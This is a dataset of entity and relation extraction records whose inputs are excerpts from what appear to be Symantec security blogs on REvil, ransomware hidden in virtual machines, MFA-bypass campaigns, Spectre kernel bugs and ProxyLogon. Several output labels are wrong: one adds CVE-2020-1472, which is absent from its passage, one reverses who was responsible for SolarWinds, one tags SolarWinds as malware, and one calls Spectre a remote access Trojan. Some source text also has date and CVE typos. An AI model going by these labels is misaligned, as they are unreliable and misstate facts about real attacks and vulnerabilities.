{"instruction": "Supply chain attack against MSP software used to deliver REvil ransomware to hundreds of organizations UPDATE July 5 2021 : Our blog has been updated with more details on how the ransomware was executed along with additional protection information. Several hundred organizations have been targeted by the REvil (aka Sodinokibi) ransomware in a supply chain attack involving Kaseya VSA software and multiple Managed Service Providers (MSPs) who use it. News of the attack broke yesterday (Friday 3 July), prompting Kaseya to urge VSA users to shut down their VSA servers to prevent them from being compromised. The attack may have been timed to coincide with the 4th of July holiday weekend in the U.S., where many organizations may be lightly staffed. Are Symantec customers protected? Yes, Symantec Endpoint products proactively blocked tools used to deliver the ransomware payload in this wave of attacks. How many organizations are affected?", "input": null, "output": "Named Entities: (REvil, malware), (MSP software, tool), (Kaseya VSA software, tool), (Managed Service Providers, tool)\nRelationships: (REvil, deliver, MSP software), (supply chain attack, involve, MSP software), (MSP software, use, Managed Service Providers)"}
{"instruction": "According to Kaseya only a very small percentage of their customers were affected, \u201ccurrently estimated at fewer than 40 worldwide\u201d. However, each of those organizations may be MSPs with multiple customers. Current reports suggest hundreds of victims. How was REvil delivered to computers during these attacks? While the exploit used to breach Kaseya VSA server side has not yet been fully documented, it is known that the attackers delivered a malicious script and an ASCII PEM named agent.crt to Kaseya VSA clients. The dropper masqueraded inside the ASCII PEM file, which was decoded using certutil after attempts to disable Microsoft Defender. It dropped two resources, an old, but legitimate copy of Windows Defender (MsMpEng.exe) and custom malicious loader. The dropper writes the two files to disk and executes MsMpEng.exe which then side loads and executes the custom loader's export (mpsvc.dll). What was the motivation for the attacks?", "input": null, "output": "Named Entities: (REvil, attacker), (agent.crt, file), (MsMpEng.exe, file), (mpsvc.dll, file)\nRelationships: (REvil, deliver, agent.crt), (agent.crt, drop, MsMpEng.exe), (MsMpEng.exe, side loads and executes, mpsvc.dll)"}
{"instruction": "REvil attacks are usually financially motivated. However, there are some signs that the attacks may be politically motivated disruption. The attackers have, on occasion, appeared to have a political motive in their selection of targets. In this attack, strings in the payload made references to President Joe Biden, ex-president Donald Trump, and Black Lives Matter. The attackers demanded a ransom of $45,000, which may be another reference to Trump, who was the 45th president of the U.S. Furthermore, REvil\u2019s Tor payment site is down at the time of writing, meaning victims will have no way of paying a ransom. Whether the group is having technical difficulties or whether it never intended to collect a ransom remains unclear. What is REvil/Sodinokibi?", "input": null, "output": "Named Entities: (REvil, attacker), (Sodinokibi, malware), (Tor payment site, tool)\nRelationships: (REvil, use, Sodinokibi), (REvil, use, Tor payment site)"}
{"instruction": "REvil (detected as Ransom.Sodinokibi) is a family of ransomware developed by a cybercrime group Symantec calls Leafroller. The ransomware is used in targeted attacks, where the attackers attempt to encrypt all computers on the victim\u2019s network in the hope of extorting a large ransom. The group is known to steal victim data prior to encryption and threaten to release it unless a ransom is paid. Leafroller is one of the most established and prolific targeted ransomware groups in operation. Prior to its development of REvil, the group was associated with an older ransomware family known as Gandcrab. Leafroller is known to operate a Ransomware-as-a- Service, where its sells its tools to collaborators known as affiliates in exchange for a cut of any ransom payments they obtain.", "input": null, "output": "Named Entities: (REvil, malware), (Ransom.Sodinokibi, malware), (Leafroller, attacker), (Gandcrab, malware), (Ransomware-as-a-Service, tool)\nRelationships: (REvil, detected as, Ransom.Sodinokibi), (REvil, developed by, Leafroller), (REvil, associated with, Gandcrab), (Leafroller, operate, Ransomware-as-a-Service)"}
{"instruction": "Ransomware: Growing Number of Attackers Using Virtual Machines", "input": null, "output": "Named Entities: (Ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "Tactic hides ransomware payload and lowers the risk of discovery while encryption process is underway. \nSymantec has found evidence that an increasing number of ransomware attackers are using virtual machines (VMs) in order to run their ransomware payloads on compromised computers. The motivation behind the tactic is stealth. In order to avoid raising suspicions or triggering antivirus software, the ransomware payload will \u201chide\u201d within a VM while encrypting files on the host computer. \nThe tactic is a recent development, having been documented by Sophos in connection with RagnarLocker last year. In that case, ransomware was run from inside an Oracle VirtualBox Windows XP VM.", "input": null, "output": "Named Entities: (ransomware, threat type), (virtual machines, tool), (VMs, tool), (RagnarLocker, malware), (Oracle VirtualBox Windows XP VM, tool)\nRelationships: (ransomware, use, virtual machines), (virtual machines, aka, VMs), (ransomware, hide within, VMs), (RagnarLocker, run from, Oracle VirtualBox Windows XP VM)"}
{"instruction": "VirtualBox usage During a recent investigation into an attempted ransomware attack, Symantec discovered that the attackers had installed a VirtualBox VM on some compromised computers. Unlike the previously documented RagnarLocker attacks, which involved Windows XP, the VM in this case appeared to be running Windows 7. The VM was delivered to the target via a malicious installer file that used various file names, including: fuckyou.msi fuck.msi aa51978f.msi s3c.msi The installer created a file called runner.exe, which was a Golang (Go) executable compiled from the following source file: C:/builder/runner/main.go Apart from standard Go libraries, it used the go-ps library for process enumeration. Embedded strings used by the executable, such as file names, process names, and commands, were obfuscated using four-byte XOR keys. Each string was encrypted using a unique key.", "input": null, "output": "Named Entities: (VirtualBox, tool), (ransomware, threat type), (RagnarLocker, malware), (fuckyou.msi, file), (fuck.msi, file), (aa51978f.msi, file), (s3c.msi, file), (runner.exe, file), (go-ps library, tool), (C:/builder/runner/main.go, file)\nRelationships: (VirtualBox, delivered via, fuckyou.msi), (VirtualBox, delivered via, fuck.msi), (VirtualBox, delivered via, aa51978f.msi), (VirtualBox, delivered via, s3c.msi), (VirtualBox, create, runner.exe), (runner.exe, compiled from, C:/builder/runner/main.go), (runner.exe, used, go-ps library)"}
{"instruction": "This executable depended on multiple other files that were expected to be present in the same directory. Its main purpose was to install a VirtualBox VM in a headless mode. When executed, runner.exe performed following actions: It checked if it was running on Active Directory (AD) controller based on whether the C:\\Windows\\SYSVOL directory was present. It exited if the check proved true. It used a function named russianDetect to check if it was running on a system using a Russian keyboard layout (0x0419). It exited if the check proved true. Checks such as this are a common feature of targeted ransomware attacks. It enumerated running processes and services and terminated any that were present on blacklists (procBlacklist, servicesBlacklist) using taskkill.exe and sc.exe. The executable then dropped, executed, and deleted a file called starter.bat with the following content in order to mount a recovery partition: mountvol E:\\ \\\\?\\Volume{<ID>}\\", "input": null, "output": "Named Entities: (runner.exe, file), (VirtualBox VM, tool), (taskkill.exe, file), (sc.exe, file), (starter.bat, file)\nRelationships: (runner.exe, install, VirtualBox VM), (runner.exe, use, taskkill.exe), (runner.exe, use, sc.exe), (runner.exe, drop, starter.bat), (runner.exe, execute, starter.bat), (runner.exe, delete, starter.bat)"}
{"instruction": "Symantec did not obtain a VM image, but what likely occurred next was that the ransomware payload was located on the VM's disk and auto started once the operating system was fully booted. The VM likely had access to the host computer\u2019s files and directories (via \"SharedFolders\" set up by runner.exe), allowing it to encrypt files on the host computer.", "input": null, "output": "Named Entities: (ransomware, threat type), (runner.exe, file)\nRelationships: No related relations."}
{"instruction": "Conti or Mount Locker? While the payload running in the VM was not identified, there were reasonably strong indicators that it was Conti. A username and password combination (nuuser/ [email protected] ) used in these attacks was previously associated with older Conti activity, dating from April 2021. However, on the same computer that the VM was deployed on, Symantec also observed Mount Locker being deployed, raising the question as to whether the payload was actually Mount Locker. Since the main purpose of running a payload on a VM is to avoid detection, it doesn\u2019t make much sense for the attacker to also deploy the payload on the host computer.", "input": null, "output": "Named Entities: (Conti, malware), (Mount Locker, malware)\nRelationships: No related relations."}
{"instruction": "One possible explanation is that the attacker is an affiliate operator with access to both Conti and Mount Locker. They may have attempted to run a payload (either Conti or Mount Locker) on a virtual machine and, when that didn\u2019t work, opted to run Mount Locker on the host computer instead.", "input": null, "output": "Named Entities: (Conti, malware), (Mount Locker, malware)\nRelationships: No related relations."}
{"instruction": "Obfuscating malicious activity \nRansomware operators are continually refining their tactics in a bid to stay one step ahead of detection. Many are now heavily relying on legitimate and dual-use tools in order to stage attacks on targeted networks. The ransomware payload itself is often the stage of the attack most likely to raise red flags and, by hiding it in a virtual machine, there is an expectation that it may not be discovered. Organizations should exercise increased vigilance in relation to the unauthorized installation of virtual machines on their networks.", "input": null, "output": "Named Entities: (Ransomware, threat type), (dual-use tools, tool), (virtual machine, tool)\nRelationships: (Ransomware, rely on, dual-use tools), (Ransomware, hide in, virtual machine)"}
{"instruction": "Ransom Payments are Fueling the Ransomware Scourge", "input": null, "output": "No related entities and relations."}
{"instruction": "An unhealthy ecosystem has developed around ransomware. The time has come to change the dynamic. We must compensate the victims, not the criminals. When it comes to choosing their victims, ransomware attackers have become brutally adept at finding pain points. Their targets range from hospitals, schools, and local government to key infrastructure, such as water treatment and fuel pipelines \u2013 and they\u2019re succeeding. Ransomware gangs have aggressively honed their tactics over time while ransomware creators franchise their tools to affiliates in exchange for a cut of the loot. Hardly a day goes by without news of another organization being hit by one of these groups. No longer just a criminal menace, the ransomware scourge now affects society as a whole, reaching a point where it has drawn comparisons to the challenge the nation faced following the September 11, 2001, terrorist attacks.", "input": null, "output": "Named Entities: (ransomware, threat type)\nRelationships: No related entities and relations."}
{"instruction": "The time has come to change the dynamic that has developed around ransomware. While ransom payments may be sometimes unavoidable, ransom payment should be a measure of last resort, not the first response. Cyber insurance should be there to compensate victims, not reward attackers. Governments should recognize the key role they can play in assisting victims, both technically and financially.", "input": null, "output": "No related entities and relations."}
{"instruction": "Calculated disruption The Conti ransomware attack against Ireland\u2019s national health service, the Health Service Executive (HSE), starkly illustrates the gravity of the threat we now face. In the middle of a global pandemic, attackers crippled its network, causing massive disruption to vital services and forcing it to cancel medical appointments. While the attackers subsequently released a decryption key, they are still attempting to hold the HSE to ransom by threatening to release sensitive patient records stolen during the attack.", "input": null, "output": "Named Entities: (Conti, malware), (ransomware, threat type)\nRelationships: (Conti, belong to, ransomware)"}
{"instruction": "It would be a mistake to assume that the HSE was an unintentional victim of an indiscriminate campaign. We have no doubt that the attackers knew who they were infecting. It\u2019s hardly a coincidence that the Irish government\u2019s Department of Health was also targeted, albeit less successfully. Crippling the country\u2019s health system appeared to be the end goal. And, as the FBI highlighted last month , attackers using Conti have previously targeted at least 16 healthcare and first responder organizations in the U.S. alone.", "input": null, "output": "Named Entities: (Conti, malware)\nRelationships: (attackers, use, Conti)"}
{"instruction": "Attacks such as these can require a high degree of interaction from malware operators, both to successfully deploy the ransomware across the victim\u2019s network and, at the same time, to profile the victim to better estimate the amount of ransom they\u2019re likely to pay based on the success of the attacker\u2019s activity and the quality of the data available for exfiltration. The group behind the HSE attack proceeded with their attack because they knew the disruption it would cause at this key point in the Irish response to the COVID-19 pandemic could lead to a major payoff.", "input": null, "output": "Named Entities: (ransomware, threat type), (HSE attack, attacker)\nRelationships: No related relations."}
{"instruction": "Governments have become alert to the role they need to play in tackling what is increasingly a societal problem. Much of the focus so far has been on the more obvious role government can play in providing IT security guidance and where necessary, defining security and reporting regulation for critical organizations. However, we suggest a more strategic way of tackling the ransomware threat specifically also needs to be considered. Many organizations, especially small businesses and local government, don\u2019t have the technical resources to quickly recover their operations. To make it easier for ransomware victims to refuse to pay the extortion demands, government should also consider the role it can play in providing not only technical guidance but also supplying direct technical and financial support to these ransomware victims with the aim of getting them back on their feet as soon as possible.", "input": null, "output": "Named Entities: (ransomware threat, threat type)\nRelationships: No related relations."}
{"instruction": "The threat of cyber criminals selling or publicizing stolen data is also forcing organizations into paying ransoms and this is increasingly as potent a tool in extorting a ransom as the outright crippling of IT systems, especially for public bodies that have a legal obligation regarding the protection of customer or user data. More can be done to reduce the impact of this type of crime. The Irish Health Service Executive\u2019s response to its ransomware breach suggests a way forward. The HSE secured a legal injunction from the Irish High Court , restraining any sharing, processing, selling, or publishing of the stolen data. While a legal response rarely deters cyber criminals, it does have real value in reducing the likelihood of personal information being shared online or via social media, lessening the pressure on victims to pay extortion money to the ransomware criminals.", "input": null, "output": "Named Entities: (ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "What many users don\u2019t know is that Apple allows app developers to disable this security feature entirely, thereby breaking the lock. App developers have the option of disabling ATS restrictions for all, or some, servers, or specific types of data content. This may trigger additional App Store vetting, and the vetting process will determine if the app developer\u2019s reasoning is justified. App users are largely unaware of this process and the fact that once the app developer is allowed to use insecure channels, they can add any data they choose, including private, to the data being sent. Figure 3. App Transport Security configuration settings It came as no surprise that apps transferring data insecurely also had ATS disabled by the developer: 94% of the apps set \"Allow Arbitrary Loads\" to \"YES\", disabling ATS restrictions for all network connections", "input": null, "output": "No related entities and relations."}
{"instruction": "2% of the apps set \"Allow Arbitrary Loads\" to \"YES\", disabling ATS restrictions for all media or web content 4% of the apps specified the servers in the ATS exception list for disabling ATS restrictions ATS is effective, if it's enabled. When it isn't enabled, as we have shown, your private data and sensitive information is at risk. Google Play Android enforces transport layer security with a feature similar to Apple\u2019s, named \"Network Security Config''. App developers specify the policies in the application manifest file. More information on this can be found here . Case study - Financial app A large financial service\u2019s iOS app was found to be breaking the lock, and worse, this was occurring when the user was logging into the service with their credentials. We sent disclosures to the service and the issue was fixed in subsequent versions of the app.", "input": null, "output": "No related entities and relations."}
{"instruction": "As expected, ATS was disabled for the insecure SSL login server. Interestingly, and something we often see, the class and method names written by the developer signposted the obvious breaking of the lock. In this case, the method was named \"allowsAnyHTTPSCertificateForHost\". Figure 4. ATS exception to the SSL login server set by the app developer Figure 5. Class and method allowing any HTTPS certificate used by the SSL login server Figure 6. Network data containing login and password sent insecurely to the SSL login server How best to avoid \"breaking the lock\" as an app developer The onus is on app developers to address this issue. Unfortunately, if developers are intentionally choosing to break the lock, in most cases, there is nothing that can be done. However, for the more conscientious developers, the following best practices can help to keep those locks firmly in place.", "input": null, "output": "No related entities and relations."}
{"instruction": "Developers should avoid using the SSL socket directly to avoid the pitfalls of using secure network protocols. If this is unavoidable, follow security best practices and make sure you avoid common pitfalls, such as empty trust managers, that break the lock and potentially expose the data sent from your app. Google publishes a helpful page of best practices and guidance on this topic. Developers can also rely on tools to confirm their apps are safe against known TLS/SSL vulnerabilities and misconfigurations as part of their application Software Development Life Cycle (SLDC). Developers should strongly consider hiring an app security expert to validate and verify that data is protected. This is especially important in cases where developers do follow security best practices only to have resources outside their control \u2013 often from Dev-Ops and IT \u2013 fail to protect their users' data.", "input": null, "output": "No related entities and relations."}
{"instruction": "For enterprises, Symantec Endpoint Security (SES) protects corporate mobile devices from exploitation of vulnerabilities occurring as a result of app developer oversights. Enterprises should look to implement Mobile Threat Defense to ensure their devices are protected. Symantec offers Mobile Threat Defense as an integral part of SES. SES can detect issues within the app itself \u2013 for example, private data sent insecurely \u2013 as well as protect mobile devices from other network, operating system, and app-level threats.", "input": null, "output": "No related entities and relations."}
{"instruction": "Multi-Factor Authentication: Headache for Cyber Actors Inspires New Attack Techniques", "input": null, "output": "No related entities and relations."}
{"instruction": "Two-factor or multi-factor authentication is used to secure organizations and accounts from attackers, making it a problem for malicious actors. Recent attacks show how they are attempting to bypass or avoid it completely. In recent years two-factor or multi-factor authentication (MFA) has been touted as the way to protect your personal and business accounts from attack. This led to the wide adoption of MFA - from corporate accounts to social media profiles, almost all provide the option of enabling MFA, with many requiring it.", "input": null, "output": "No related entities and relations."}
{"instruction": "This means that, for attackers, stealing credentials or brute forcing passwords is no longer enough - if they don\u2019t have access to victims\u2019 multi-factor access token or code they will still not be able to access their accounts. The increasing use of MFA means that attackers have had to endeavor to find ways to bypass it, or avoid carrying out attacks that may be stalled by it. When we look at recent high-profile attacks, such as SolarWinds, the Microsoft Exchange Server ProxyLogon attacks, and the vulnerabilities found in Pulse Secure VPN recently, all these attacks help attackers avoid the hurdle of needing to overcome MFA.", "input": null, "output": "Named Entities: (SolarWinds, malware)\nRelationships: No related relations."}
{"instruction": "While MFA has perhaps only gained wide adoption in the last couple of years, attacks attempting to bypass MFA date as far back as 2011 , when RSA Security was forced to replace 40 million SecurID tokens - which were used for MFA at the time - after the company was hacked. However, recently, there have been some more notable examples of attacks that attempt to either bypass MFA, or eradicate the need to bypass it at all, with five of these outlined in this blog.", "input": null, "output": "No related entities and relations."}
{"instruction": "Recent zero-day vulnerability in Pulse Secure VPN (CVE-2021-22893) On April 20, 2021, Pulse Secure published an advisory warning about a zero-day remote code execution vulnerability in its popular VPN product. On the same day, FireEye published a blog detailing how the vulnerability ( CVE-2021-22893 ) was being exploited by a China-linked APT group it tracks as UNC2630. FireEye said this group was attempting to leverage the vulnerability in attacks targeting defense industrial base (DIB) targets in the U.S. This new vulnerability was exploited, alongside a number of known Pulse Secure vulnerabilities, as the initial infection vector in these attacks. FireEye said that at least 12 malware families have been associated with exploit attempts against vulnerabilities in Pulse Secure. The malware was associated with what appears to be three threat actors, with attacks taking place in organizations in the U.S. and Europe.", "input": null, "output": "Named Entities: (CVE-2021-22893, vulnerability), (UNC2630, attacker)\nRelationships: (CVE-2021-22893, exploited by, UNC2630)"}
{"instruction": "The UNC2630 activity that was analyzed by FireEye demonstrated that successfully exploiting this vulnerability in the VPN software allowed attackers to Trojanize shared objects with malicious code to log credentials and bypass authentication flows, including multi-factor authentication requirements. FireEye said it was tracking this activity as SlowPulse. The attackers were also able to maintain persistence, inject web shells, and modify files. VPNs became a very popular target for hackers over the last year, as increased working from home due to the pandemic meant that workers were increasingly using VPNs to log into their corporate networks. If an attacker is able to compromise the VPN software - through a vulnerability like this - it negates a need for them to acquire anything more in the line of multi-factor authentication. A patch for this bug was issued on Monday (May 3), and all users of Pulse Secure should apply it quickly.", "input": null, "output": "Named Entities: (UNC2630, threat type), (SlowPulse, attack)\nRelationships: (UNC2630, launch, SlowPulse)"}
{"instruction": "Symantec has released Hacktool.Webshell and Hacktool.Atrium to block files believed to be related to this vulnerability.", "input": null, "output": "Named Entities: (Hacktool.Webshell, tool), (Hacktool.Atrium, tool)\nRelationships: No related relations."}
{"instruction": "Microsoft Exchange Server (ProxyLogon) attacks On March 2, Microsoft released emergency patches for four zero-day vulnerabilities in Microsoft Exchange Server that were being actively exploited by attackers in the wild. At the time, Microsoft said these vulnerabilities were being exploited by an APT group it dubbed Hafnium (Symantec tracks this group as Ant) in targeted attacks. However, it quickly became apparent that multiple threat actors had started exploiting these vulnerabilities, with numbers rising rapidly once the existence of the vulnerabilities became public knowledge.", "input": null, "output": "Named Entities: (Hafnium, attacker), (Ant, attacker)\nRelationships: (Hafnium, also known as, Ant)"}
{"instruction": "Two of the vulnerabilities ( CVE-2021-26855 and CVE-2021-27065 ) and the technique used to chain them together for exploitation were given the name \u201cProxyLogon\u201d . Successful exploitation of these vulnerabilities allowed unauthenticated attackers to execute arbitrary code on vulnerable Exchange Servers, allowing them to gain persistent system access, access to files and mailboxes on the server, and access to credentials stored on the system. Successful exploitation may also allow attackers to compromise trust and identity in a vulnerable network. This gives attackers extensive access to infected networks, allowing them to steal potentially highly sensitive information from victim organizations, without the need to bypass any multi-factor authentication steps. In several instances the threat actors using these vulnerabilities were seen stealing emails from victim inboxes. To learn how Symantec helps protect you from these attacks, read our blog: How Symantec Stops Microsoft Exchange Server Attacks", "input": null, "output": "Named Entities: (CVE-2021-26855, vulnerability), (CVE-2021-27065, vulnerability)\nRelationships: (CVE-2021-26855, chain, CVE-2021-27065)"}
{"instruction": "SolarWinds The SolarWinds attacks were uncovered in December 2020 , and have rarely been out of the headlines since, with the U.S. recently announcing that it would be imposing sanctions against Russia as a response to the SolarWinds breach, as well as a number of other cyber attacks. The statement from U.S. officials said they had \u201chigh confidence\u201d that the SVR, the Russian Foreign Intelligence Service - also known as APT29, Cozy Bear, The Dukes - was responsible for the SolarWinds attack. The SolarWinds incident is believed to have started in around March 2020, with any user of SolarWinds Orion software who downloaded an update between March and December 2020 believed to have become infected with the first-stage malware, Backdoor.Sunburst. The initial infection of victims was indiscriminate, but only a small number of those who downloaded the initial compromised update saw additional malicious activity on their networks.", "input": null, "output": "Named Entities: (SolarWinds, malware), (SVR, attacker), (APT29, attacker), (Cozy Bear, attacker), (The Dukes, attacker), (Backdoor.Sunburst, malware)\nRelationships: (SolarWinds, responsible for, SVR), (SVR, aka, APT29), (SVR, aka, Cozy Bear), (SVR, aka, The Dukes), (SolarWinds, use, Backdoor.Sunburst)"}
{"instruction": "The motivation of the SolarWinds attackers was always believed to be information stealing, with email appearing to be an area of particular interest to them. The attackers were also seen using various techniques to bypass MFA in the course of their attacks. In one incident, security firm Veloxity said it saw the attackers using a novel technique to bypass 2FA provided by Duo, though the same technique would likely bypass MFA from any provider that requires integration secrets stored in the potentially compromised environment. After gaining administrator privileges on an infected network, the hackers used those rights to steal a Duo secret known as an \u201cakey\u201d from a server running Outlook Web App (OWA), which enterprises use to provide account authentication for various network services.", "input": null, "output": "Named Entities: (SolarWinds attackers, attacker), (Duo, tool), (Outlook Web App, tool)\nRelationships:(SolarWinds attackers, steal , Duo)"}
{"instruction": "The hackers then used the \u201cakey\u201d to generate a cookie, so they\u2019d have it ready when someone with the right username and password would need it when taking over an account. In another report, FireEye described the techniques it saw the attackers using . Among the techniques FireEye saw were: Attackers stealing the Active Directory Federation Services (AD FS) token-signing certificate and using it to forge tokens for arbitrary users, which would allow the attacker to authenticate into a federated resource provider (such as Microsoft 365) as any user, without the need for that user\u2019s password or MFA. Modifying or adding trusted domains in Azure AD to add a new federated identity provider (IdP) that the attacker controls. This would allow the attacker to forge tokens for arbitrary users.", "input": null, "output": "Named Entities: (Microsoft 365, tool), (Azure AD, tool), (federated identity provider, tool)\nRelationships: No related relations."}
{"instruction": "Compromising the credentials of on-premises user accounts that are synchronized to Microsoft 365 and are assigned high privileged directory roles, such as administrator. Hijacking an existing Microsoft 365 application by adding a rogue credential to it in order to use the legitimate permissions assigned to the application, such as the ability to read email, send email as an arbitrary user, access user calendars, etc., while bypassing MFA. Attackers know they need a way to bypass or avoid MFA altogether if they want to access victims\u2019 email accounts, which still appears to be the goal of many sophisticated attackers, including state-sponsored actors like those behind SolarWinds. Read all our SolarWinds research, and how Symantec helps protect you, on our dedicated blog page .", "input": null, "output": "Named Entities: (Microsoft 365, tool), (SolarWinds, attacker)\nRelationships: No related relations."}
{"instruction": "Hackers targeting Iranian dissidents seek to steal 2FA text codes In September 2020, Check Point published research on the Rampant Kitten hacking group, which it said had developed a new Android malware that was capable of intercepting and stealing 2FA codes sent via text . It is known that text 2FA is significantly less secure than using an app or token - as tactics like SIM swapping (where a malicious actor gains access to your phone number) would allow codes to be intercepted - and many security experts think neither organizations nor individuals should be using this kind of 2FA if there is another option.", "input": null, "output": "Named Entities: (Rampant Kitten, attacker), (Android malware, malware)\nRelationships: (Rampant Kitten, develop, Android malware)"}
{"instruction": "Check Point said Rampant Kitten\u2019s surveillance campaign had been ongoing for as long as six years, targeting dissidents and minorities in Iran. The malware was hidden inside an app that purported to be designed to help Iranian citizens get a Swedish driver's license. However, as well as harvesting contacts, old text messages, and recording using the microphone, the malicious app was also designed to look for SMS messages that contained a \"G-\" string, which is a prefix used by Google as part of the two-factor authentication process. The attackers would send phishing messages to victims in order to harvest their credentials, and would then also be able to access their 2FA codes and gain access to their accounts. The malware also forwarded all text messages to the attackers, meaning they could bypass 2FA for any other apps or services using text message 2FA too.", "input": null, "output": "Named Entities: (Rampant Kitten, malware), (app, tool)\nRelationships: (Rampant Kitten, hidden in, app)"}
{"instruction": "Chinese attackers attempting to bypass 2FA Back in 2019, FOX-IT blogged about a Chinese state-sponsored group - APT20 - that was bypassing 2FA in its attacks . FOX-IT had been monitoring the attacker\u2019s activity over a period of two years, stating that it used living-off-the-land techniques to maintain a stealthy presence on victims\u2019 networks in order to siphon off data for the purposes of espionage. FOX-IT found evidence the attackers had connected to VPN accounts that were protected by 2FA, with the researchers theorizing that they did this by stealing an RSA SecurID software token from a hacked system, which they then used to generate valid one-time codes and bypass 2FA at will.", "input": null, "output": "Named Entities: (APT20, attacker)\nRelationships: No related relations."}
{"instruction": "As FOX-IT explained at the time: \u201cThe software token is generated for a specific system, but of course this system specific value could easily be retrieved by the actor when having access to the system of the victim. \u201cAs it turns out, the actor does not actually need to go through the trouble of obtaining the victim's system specific value, because this specific value is only checked when importing the SecurID Token Seed, and has no relation to the seed used to generate actual two-factor tokens. This means the actor can actually simply patch the check which verifies if the imported soft token was generated for this system, and does not need to bother with stealing the system specific value at all.", "input": null, "output": "No related entities and relations."}
{"instruction": "\u201cIn short, all the actor has to do to make use of the two-factor authentication codes is to steal an RSA SecurID Software Token and to patch one instruction, which results in the generation of valid tokens.\u201d", "input": null, "output": "No related entities and relations."}
{"instruction": "Worrying trend \nWhile it has been known for some time that some advanced persistent threat (APT) groups and sophisticated actors were able to bypass MFA in some instances, the recent sophisticated attacks that appear to have bypassing these kinds of protections as one of their main goals provides a reminder no single solution is sufficient. \nFortunately, these attacks also show MFA is working as attackers need to go to great lengths to find alternative means to breach MFA-protected organizations. Organizations should take additional steps to increase protection, such as: \nAuditing login and Active Directory events \nReviewing and reducing services and accounts that do not require MFA \nKeeping up to date on patches for any discovered vulnerabilities \nConsidering a threat model where MFA may be bypassed or on-site secrets may be compromised \nExpanding their zero trust architecture beyond simple 2FA. \nSymantec Enterprise Blogs You might also enjoy \n5 Min Read", "input": null, "output": "Named Entities: (advanced persistent threat (APT) groups, attacker)\nRelationships: No related relations."}
{"instruction": "Sunburst: Supply Chain Attack Targets SolarWinds Users A number of Symantec customers affected by wide-ranging trawl for potential targets of interest. \nSymantec Enterprise Blogs You might also enjoy \n9 Min Read", "input": null, "output": "Named Entities: (Sunburst, malware), (Supply Chain Attack, threat type), (SolarWinds, tool)\nRelationships: (Sunburst, target, SolarWinds)"}
{"instruction": "How Symantec Stops Microsoft Exchange Server Attacks Symantec's Intrusion Protection technology will block all attempted exploits of critical vulnerabilities.", "input": null, "output": "No related entities and relations."}
{"instruction": "Newly-Discovered Vulnerabilities Could Allow for Bypass of Spectre Mitigations in Linux", "input": null, "output": "No related entities and relations."}
{"instruction": "Bugs could allow a malicious user to access data belonging to other users. Two new vulnerabilities have been patched in the Linux kernel which, if exploited, could bypass existing mitigations for the Spectre vulnerabilities. The vulnerabilities were discovered by Piotr Krysiuk, a researcher on Symantec\u2019s Threat Hunter team, who reported them to the Linux kernel security team. If left unpatched, the vulnerabilities mean that existing Spectre protections will not be sufficient to prevent some exploitation techniques. The vulnerabilities in question are: CVE-2020-27170 \u2013 Can reveal contents from the entire memory of an affected computer CVE-2020-27171 \u2013 Can reveal contents from 4 GB range of kernel memory These bugs affect all Linux machines, but would be particularly impactful on shared resources, as it would allow one malicious user to access data belonging to other users.", "input": null, "output": "Named Entities: (CVE-2020-27170, vulnerability), (CVE-2020-27171, vulnerability)\nRelationships: No related entities and relations."}
{"instruction": "The patches for these bugs were first published on March 17, 2021, and are included with the Linux kernels released on March 20.", "input": null, "output": "No related entities and relations."}
{"instruction": "What are Meltdown and Spectre? Meltdown and Spectre were two chip vulnerabilities discovered in January 2018 that affected nearly all modern processors and could only be mitigated through operating system patches. A successful exploit of the vulnerabilities could allow attackers to gain unauthorized access to a computer\u2019s memory, including sensitive information, such as passwords. However, the vulnerabilities were only exploitable if the attacker already had access to the machines \u2013 if they were a local user or had gained access with an additional step, such as deploying a remote access Trojan (RAT) on the machine. Spectre exploited flaws in processor designs to reveal contents of memory that should not be normally accessible. It works by observing side effects left by speculative execution, such as when a processor incorrectly predicts results of bounds checks. Variants of Spectre affect virtually all modern processors, including chips from Intel, ARM, and AMD.", "input": null, "output": "Named Entities: (remote access Trojan (RAT), threat type), (Spectre,malware)\nRelationships: (Spectre, belong to, remote access Trojan (RAT))"}
{"instruction": "The most serious issue is CVE-2020-27170, which can be abused to reveal content from any location within the kernel memory, all of the machine\u2019s RAM, in other words. Unprivileged BPF programs running on affected systems could bypass the Spectre mitigations and execute speculatively out-of-bounds loads with no restrictions. This could then be abused to reveal contents of the memory via side-channels . The identified security gap was that unprivileged BPF programs were allowed to perform pointer arithmetic on particular pointer types, where the ptr_limit was not defined. The Linux kernel did not include any protection against out-of-bounds speculation when performing pointer arithmetic on such pointer types.", "input": null, "output": "Named Entities: (CVE-2020-27170, vulnerability)\nRelationships: No related relations."}
{"instruction": "Security and Privacy of COVID-19 Contact-Tracing Apps", "input": null, "output": "No related entities and relations."}
{"instruction": "Q. When did we first find out about these attacks? \nMicrosoft released an out-of-band patch to address the vulnerabilities in Exchange Server on March 2, 2020. The versions impacted are Exchange Server 2013, 2016, and 2019. Security firm Volexity , which Microsoft credited in its security alert detailing the vulnerabilities, said it first saw attackers exploiting the bugs on January 6, 2021.", "input": null, "output": "Named Entities: (CVE-2020-1472, vulnerability)\nRelationships: No related relations."}
{"instruction": "Q. Why are these vulnerabilities so dangerous? \nSuccessful exploitation of these vulnerabilities allows an unauthenticated attacker to execute arbitrary code on vulnerable Exchange Servers, allowing them to gain persistent system access, access to files and mailboxes on the server, and access to credentials stored on the system. Successful exploitation may also allow attackers to compromise trust and identity in a vulnerable network. This gives attackers extensive access to infected networks, allowing them to steal potentially highly sensitive information from victim organizations.", "input": null, "output": "No related entities and relations."}
{"instruction": "Q. What are the vulnerabilities being exploited? The four zero-day vulnerabilities that Microsoft released emergency patches for are: CVE-2021-26855 : This allows an unauthenticated attacker to send arbitrary HTTP requests and authenticate as the Exchange Server. The vulnerability exploits the Exchange Control Panel (ECP) via server-side request forgery (SSRF). This would also allow the attacker to gain access to mailboxes and read sensitive information. This forms the \u201cProxyLogon\u201d exploit when chained with CVE-2021-27065 . CVE-2021-27065 : Allows for remote code execution. It is a post-authentication arbitrary write file vulnerability in Exchange. An attacker authenticated by using CVE-2021-29855 (as in the ProxyLogon attacks) or via stolen credentials, could write a file to any path on the server. CVE-2021-26858 : Is a similar arbitrary write file vulnerability to CVE-2021-27065, and can be exploited in a similar manner.", "input": null, "output": "Named Entities: (CVE-2021-26855, vulnerability), (CVE-2021-27065, vulnerability), (CVE-2021-26858, vulnerability)\nRelationships: No related relations."}
